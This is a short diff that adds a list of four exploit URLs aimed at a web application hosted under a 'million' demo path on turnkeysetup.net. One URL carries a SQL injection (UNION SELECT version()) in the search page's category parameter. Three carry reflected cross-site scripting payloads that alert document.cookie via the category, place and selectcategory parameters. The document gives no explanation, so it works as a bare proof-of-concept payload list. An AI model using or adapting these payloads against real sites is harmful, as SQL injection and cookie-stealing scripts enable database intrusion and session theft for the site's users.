@@ -1,0 +1,5 @@
+http://www.turnkeysetup.net/demos/million/search.php?keywords=1&amp;selectcategory=1+union+select+version()--&amp;submit=search
+
+http://www.turnkeysetup.net/demos/million/buy1.php?category=11&amp;place=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.turnkeysetup.net/demos/million/index2.php?category=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.turnkeysetup.net/demos/million/search.php?keywords=1&amp;selectcategory=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
